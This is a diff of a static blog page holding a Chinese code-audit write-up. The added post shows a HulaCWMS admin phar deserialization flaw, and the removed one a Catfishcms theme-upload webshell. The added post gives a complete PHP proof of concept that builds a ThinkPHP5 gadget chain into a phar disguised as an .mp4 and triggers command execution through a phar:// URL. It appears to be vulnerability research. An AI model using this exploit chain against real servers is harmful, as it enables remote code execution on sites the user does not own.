@@ -18,7 +18,7 @@
   <meta name="author" content="sp4z">
   <meta name="keywords" content="">
   
-  <title>代码审计：Catfishcms后台文件上传漏洞 - sp4z&#39;s Blog</title>
+  <title>代码审计：HulaCWMS后台phar反序列化漏洞 - sp4z&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="代码审计：Catfishcms后台文件上传漏洞">
+            <span class="h2" id="subtitle" title="代码审计：HulaCWMS后台phar反序列化漏洞">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-08-17 08:29" pubdate>
-        2021年8月17日 早上
+      <time datetime="2021-08-29 20:14" pubdate>
+        2021年8月29日 晚上
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      114 字
+      343 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      5
        分钟
     </span>
   
@@ -225,23 +225,37 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">代码审计：Catfishcms后台文件上传漏洞</h1>
+            <h1 style="display: none">代码审计：HulaCWMS后台phar反序列化漏洞</h1>
             
             <div class="markdown-body">
-              <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>/application/admin/controller/Index.php</p>
-<p>uploadtheme方法没有判断压缩文件内容，直接解压到public目录下，造成文件上传漏洞</p>
-<p><a href="https://imgtu.com/i/fhAVC8"><img src="https://z3.ax1x.com/2021/08/17/fhAVC8.png" srcset="/img/loading.gif" lazyload alt="fhAVC8.png"></a></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>下载主题压缩包<strong>，</strong>加入webshell后重新压缩</p>
-<p><a href="http://www.catfish-cms.com/article/68.html">http://www.catfish-cms.com/article/68.html</a></p>
-<p><a href="https://imgtu.com/i/fhAFEt"><img src="https://z3.ax1x.com/2021/08/17/fhAFEt.png" srcset="/img/loading.gif" lazyload alt="fhAFEt.png"></a></p>
-<p><a href="https://imgtu.com/i/fhAPHI"><img src="https://z3.ax1x.com/2021/08/17/fhAPHI.png" srcset="/img/loading.gif" lazyload alt="fhAPHI.png"></a></p>
-<p>登陆后台</p>
-<p><a href="https://imgtu.com/i/fhACDA"><img src="https://z3.ax1x.com/2021/08/17/fhACDA.png" srcset="/img/loading.gif" lazyload alt="fhACDA.png"></a></p>
-<p>进入系统设置-&gt;主题，上传修改后的主题</p>
-<p><a href="https://imgtu.com/i/fhAkUP"><img src="https://z3.ax1x.com/2021/08/17/fhAkUP.png" srcset="/img/loading.gif" lazyload alt="fhAkUP.png"></a></p>
-<p>访问/public/dismalCMS/1.php,成功getshell</p>
-<p><a href="https://imgtu.com/i/fhA9ud"><img src="https://z3.ax1x.com/2021/08/17/fhA9ud.png" srcset="/img/loading.gif" lazyload alt="fhA9ud.png"></a></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>文件解压功能经常存在文件上传漏洞</p>
+              <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载源码：<a href="http://down.chinaz.com/soft/39542.htm">http://down.chinaz.com/soft/39542.htm</a></p>
+<p>创建数据库，导入sql</p>
+<p><a href="https://imgtu.com/i/hGIf56"><img src="https://z3.ax1x.com/2021/08/29/hGIf56.png" srcset="/img/loading.gif" lazyload alt="hGIf56.png"></a></p>
+<p>/config/database.php</p>
+<p>修改数据库连接信息</p>
+<p><a href="https://imgtu.com/i/hGI4PK"><img src="https://z3.ax1x.com/2021/08/29/hGI4PK.png" srcset="/img/loading.gif" lazyload alt="hGI4PK.png"></a></p>
+<p>安装成功</p>
+<p><a href="https://imgtu.com/i/hGII2D"><img src="https://z3.ax1x.com/2021/08/29/hGII2D.png" srcset="/img/loading.gif" lazyload alt="hGII2D.png"></a></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>&#123;<br>    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Model</span>&#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">withAttr</span> = [];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;withAttr=[<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-string">&#x27;system&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;data=[<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-string">&#x27;whoami&#x27;</span>];<br>        &#125;<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span>&#123;<br><br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span> &#123;<br>    <span class="hljs-title">use</span> \<span class="hljs-title">think</span>\<span class="hljs-title">Model</span>\<span class="hljs-title">Pivot</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Process</span>;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pipes</span></span><br><span class="hljs-class">    </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Pipes</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;files=[<span class="hljs-keyword">new</span> Pivot()];<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//echo urlencode(serialize(new Windows()));</span><br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar<br><br>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();<br><br>    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> think\process\pipes\Windows();<br><br>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>运行poc生成phar.phar文件，然后把后缀名改为mp4</p>
+<p><a href="https://imgtu.com/i/hGIbqA"><img src="https://z3.ax1x.com/2021/08/29/hGIbqA.png" srcset="/img/loading.gif" lazyload alt="hGIbqA.png"></a></p>
+<p>登录后台，在编辑文章内容中上传视频文件</p>
+<p><a href="https://imgtu.com/i/hGIoxe"><img src="https://z3.ax1x.com/2021/08/29/hGIoxe.png" srcset="/img/loading.gif" lazyload alt="hGIoxe.png"></a></p>
+<p>上传phar.mp4文件</p>
+<p><a href="https://imgtu.com/i/hGI7KH"><img src="https://z3.ax1x.com/2021/08/29/hGI7KH.png" srcset="/img/loading.gif" lazyload alt="hGI7KH.png"></a></p>
+<p>点击上传视频的按钮得到回显地址</p>
+<p><a href="https://imgtu.com/i/hGIHrd"><img src="https://z3.ax1x.com/2021/08/29/hGIHrd.png" srcset="/img/loading.gif" lazyload alt="hGIHrd.png"></a></p>
+<p>利用phar触发反序列化，成功执行命令</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/admin.php?s=/update/update_exe?upath=phar://./uploads/video/<span class="hljs-number">20210816</span>/<span class="hljs-number">7512</span>b<span class="hljs-number">9</span>eb<span class="hljs-number">69</span>b<span class="hljs-number">9</span>a<span class="hljs-number">05</span>a<span class="hljs-number">6</span>fb<span class="hljs-number">461835</span>f<span class="hljs-number">86630</span>a.mp<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/hGILVI"><img src="https://z3.ax1x.com/2021/08/29/hGILVI.png" srcset="/img/loading.gif" lazyload alt="hGILVI.png"></a></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>/application/admin/controller/Update.php</p>
+<p>update_exe将可控参数$upath传入opendir，可触发phar反序列化，配合thinkphp5反序列化利用链即可实现RCE。</p>
+<p><a href="https://imgtu.com/i/hGI58O"><img src="https://z3.ax1x.com/2021/08/29/hGI58O.png" srcset="/img/loading.gif" lazyload alt="hGI58O.png"></a></p>
 
             </div>
             <hr>
@@ -262,9 +276,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/08/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AHulaCWMS%E5%90%8E%E5%8F%B0phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+                      <a href="/2021/08/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AOurphp%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">代码审计：HulaCWMS后台phar反序列化漏洞</span>
+                        <span class="hidden-mobile">代码审计：Ourphp后台SQL注入漏洞</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -272,8 +286,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/08/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AYUNUCMS%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/">
-                        <span class="hidden-mobile">代码审计：YUNUCMS后台文件删除漏洞</span>
+                      <a href="/2021/08/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ACatfishcms%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+                        <span class="hidden-mobile">代码审计：Catfishcms后台文件上传漏洞</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
